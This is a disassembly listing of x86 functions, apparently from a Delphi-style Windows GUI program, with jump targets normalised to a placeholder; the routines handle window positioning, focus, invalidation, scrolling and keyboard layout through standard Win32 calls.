je r-xdata
mov eax [ edi + 0x8 ]
call sub_44f6c4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403454
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43e07c
test al al
jne r-xdata
sub_43e0e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e07c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_440394
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e110
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e07c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_440394
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e13c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43e164
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f7bc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44f6c4
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403454
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43e164
test al al
jne r-xdata
sub_43e1cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e164
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e1ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e164
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e22c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f7bc
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403454
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43e22c
test al al
jne r-xdata
sub_43e290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e22c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e2b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_439bf4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43e2b0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43e360
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43e2b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44f7bc
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_439bf4
test eax eax
jne r-xdata
sub_43e408
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e428
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e45c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43cea8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e47c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43e4cc
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43e4f0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_437d0c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43bf58
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43bf1c
mov dl [ esp ]
mov si 0xffd1
call sub_403454
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43e548
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403454
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43e56c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403454
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43e5a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a6c8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43bfb8
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43c7c8
sub_43e5dc
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403454
pop esi
pop ebx
retn
mov eax ebx
call sub_439084
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404450
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404450
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43e65c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cba8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43a79c
sub_43e6bc
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43c91c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43bd18
pop ebx
retn
sub_43e6ec
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43e714
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43bd18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43e784
push ebx
mov ebx eax
mov eax ebx
call sub_43a608
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43bfb8
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c1f8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_439bf4
sub_43e7c0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_4372ec
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43f228
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_439bf4
sub_43e800
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f52c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43f228
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e840
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43bfb8
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43f130
sub_43e880
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43f368
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43f368
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43e8e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_439650
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_438584
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43cb14
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43e950
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a740
mov edx esi
mov eax ebx
call sub_43bf78
pop esi
pop ebx
retn
sub_43e96c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43597c
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44f7bc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403454
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403454
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403454
test al al
jne r-xdata
sub_43ea00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_440394
mov edx esi
mov eax ebx
call sub_43e96c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_439bf4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_439bf4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_439bf4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44f7bc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_439bf4
test eax eax
jne r-xdata
jmp r-xdata
sub_43eae4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_439bf4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43eb38
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_439bf4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44f7bc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_439bf4
test eax eax
jne r-xdata
sub_43eb84
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43e96c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_439bf4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44f7bc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_439bf4
test eax eax
jne r-xdata
sub_43ebe0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44f7bc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_439bf4
mov [ esi + 0xc ] eax
sub_43ec14
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_438094
mov eax ebx
mov si 0xffd0
call sub_403454
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4383e0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ecec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43bf1c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403454
inc edi
dec ebx
jne r-xdata
sub_43ed34
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor eax eax
push ebp
push sub_43edd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ecec
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43865c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43edd9
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43ede0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43bae8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43bf1c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43eed0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413808
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41369c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413828
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4137ac
call sub_43f228
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4137ac
call sub_43f228
sub_43efa8
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43eed0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43f008
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43f228
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43f228
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
test eax eax
jne r-xdata
sub_43f06c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f52c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_439bf4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_429004
call sub_4290e4
test al al
je r-xdata
mov eax ebx
call sub_43bf58
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43bf1c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43bf1c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43f130
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_4383e0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43f168
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44f7bc
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43f1a8
push ebx
mov ebx eax
mov eax ebx
call sub_44f7bc
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_453528
pop ebx
retn
mov eax ebx
call sub_44f7e4
mov eax ebx
call sub_43f228
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43f1e0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f204
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43f204
sub_43f23c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412378
mov eax edi
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43bf1c
